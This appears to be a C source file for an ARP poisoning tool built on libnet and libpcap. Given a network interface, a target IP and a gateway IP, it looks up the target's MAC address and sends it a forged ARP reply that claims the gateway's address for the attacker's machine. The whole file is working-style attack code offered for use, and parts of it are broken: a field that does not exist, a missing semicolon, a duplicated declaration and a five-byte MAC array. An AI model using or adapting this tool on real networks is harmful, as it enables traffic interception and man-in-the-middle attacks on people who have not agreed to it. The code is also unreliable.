

#include <stdio.h>
#include "libnet/libnetcore.h"
#include "pcap/pcap.h"

// android mac: f0:27:65:ff:de:43
u_char enet_dst[6] = {0xf0, 0x27, 0x65, 0xff, 0xde, 0x43};
/*
15:31:23.677800 ARP, Reply pp is-at 0d:0e:0a:0d:00:00 (oui Unknown), length 28
 */


struct{
    char* dev;
    libnet_t *arpMachine; 
    uint8_t* hostHwAddr;
    uint8_t* hostSpoofedHwAddr;
    uint32_t hostIp;
}Settings;
/* Ethernet header */
#define ETHER_H_SIZE 14
struct ethernet_h {
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
};

#define ARP_H_SIZE 28
struct arp_h{
    uint16_t hw_t;      // 0 : 2
    uint16_t proto_t;   // 2 : 2
    uint8_t hwaddrlen;  // 4 : 1
    uint8_t protoaddrlen; // 5 : 1
    uint16_t op;            // 6 : 2
    uint8_t hwsrcaddr[6];  // 8 : 6
    uint32_t netsrc;       // 14 : 4
    uint8_t hwdstaddr[6];  // 18 : 6
    uint32_t netdst;       // 24 : 4
};

void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* hwdst);

int hwAddrAreEqual(uint8_t* hw1, uint8_t* hw2){
    for(int i=0; i<6; i++)
        if (hw1[i] != hw2[i])
            return 0;
    return 1;
}

int getMacAddress(char* ip, uint8_t* hwbuf){
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;      /* The compiled filter */
    char filter[50];
    sprintf(filter, "arp");//, ip);
    char* filter_exp = filter;  /* The filter expression */
    bpf_u_int32 mask;       /* Our netmask */
    bpf_u_int32 net;        /* Our IP */
    struct pcap_pkthdr header;  /* The header that pcap gives us */
    const u_char *packet;       /* The actual packet */
    char* dev = Settings.dev;
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    
    printf("device is %s\n", dev);
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    /* Compile and apply the filter */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
        return(2);
    }
    uint8_t hwz[] = {0x0,0x0,0x0,0x0,0x0,0x0};
    struct in_addr targetaddr;
    inet_aton(ip, &targetaddr);
    sendArp(ARPOP_REQUEST, Settings.hostIp, Settings.hostSpoofedHwAddr, targetaddr.s_addr, hwz);
    struct arp_h* arpReply;
    // TODO change this to just match the target ip address..
    do{
        packet = pcap_next(handle, &header);
        if (header.len < (ARP_H_SIZE+ETHER_H_SIZE))
            continue;
        arpReply = (struct arp_h*)(packet + ETHER_H_SIZE);
    }while(!hwAddrAreEqual(arpReply->hwsrcaddr, Settings.hostSpoofedAddr))
    
    if (header.len < (ARP_H_SIZE+ETHER_H_SIZE)){
        printf("received invalid packet of length %d/%d.\n", header.len, ARP_H_SIZE+ETHER_H_SIZE);
        return 1;
    }
    struct arp_h* arpReply = (struct arp_h*)(packet + ETHER_H_SIZE);
    printf("recieved MAC: ");
    for(int i=0; i<6; i++){
        printf("%x:", (hwbuf[i]=arpReply->hwsrcaddr[i]));

    }
    printf("\n");
    /* And close the session */
    pcap_close(handle);
    return 0;
}

int arpPoison(char* ipTarget, char* ipGateway){
    // Lookup ipTarget's HWAddr..
    if ( getMacAddress(ipTarget, enet_dst) != 0)
        return 1;
    uint8_t* hwspoof = Settings.hostHwAddr;
    struct in_addr addr_src;
    struct in_addr addr_dst;
    inet_aton(ipGateway, &addr_src);
    inet_aton(ipTarget, &addr_dst);

   // TODO replace enet_dst with lookup value
    sendArp(ARPOP_REPLY, addr_src.s_addr, hwspoof, addr_dst.s_addr, enet_dst);
    return 0;
}

char ERRBUF[LIBNET_ERRBUF_SIZE];
void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* hwdst){
    libnet_ptag_t t;
    libnet_t* l = Settings.arpMachine;
    int c;
    uint8_t *packet;
    uint32_t packet_s;

    t = libnet_build_arp(
            ARPHRD_ETHER,   /* hardware addr */
            ETHERTYPE_IP,   /* protocol addr */
            6,              /* hardware addr size */
            4,              /* protocol addr size */
            type,    /* operation type */
            hwsrc,   /* sender hardware addr */
            (uint8_t *)&ipsrc,  /* sender protocol addr */
            hwdst,   /* target hardware addr */
            (uint8_t *)&ipdst,  /* target protocol addr */
            NULL,           /* payload */
            0,              /* payload size */
            l,              /* libnet context */
            0);             /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return;
    }
    t = libnet_autobuild_ethernet(
            enet_dst,           /* ethernet destination */
            ETHERTYPE_ARP,      /* protocol type */
            l);                 /* libnet handle */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        return;
    }


    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else
    {
        fprintf(stdout, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }

    c = libnet_write(l);
    if (c == -1)
    {
        fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
    }
    else
    {
        fprintf(stdout, "Wrote %d byte ARP packet\n", c);
    }

   
}

int main(int argc, char* argv[]){
    if (argc<4){
        printf("usage: ./a.out <interface> <iptarget> <ipgateway>\n");
        return 1;
    }
    Settings.dev = argv[1];
    Settings.arpMachine = libnet_init(
                                LIBNET_LINK_ADV, /* injection type */
                                Settings.dev,    /* network interface */
                                ERRBUF);         /* errbuf */
    Settings.hostHwAddr = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
    Settings.hostIp = libnet_get_ipaddr4(Settings.arpMachine);
    uint8_t hwspoof[] = {0xca,0xfe,0xba,0xaa,0xbe};
    Settings.hostSpoofedHwAddr = hwspoof;
   if (Settings.arpMachine == NULL){
        fprintf(stderr, "fail:%s\n", ERRBUF);
        exit(EXIT_FAILURE);
    }

    arpPoison(argv[2], argv[3]);
    libnet_destroy(Settings.arpMachine);
    return 0;
}
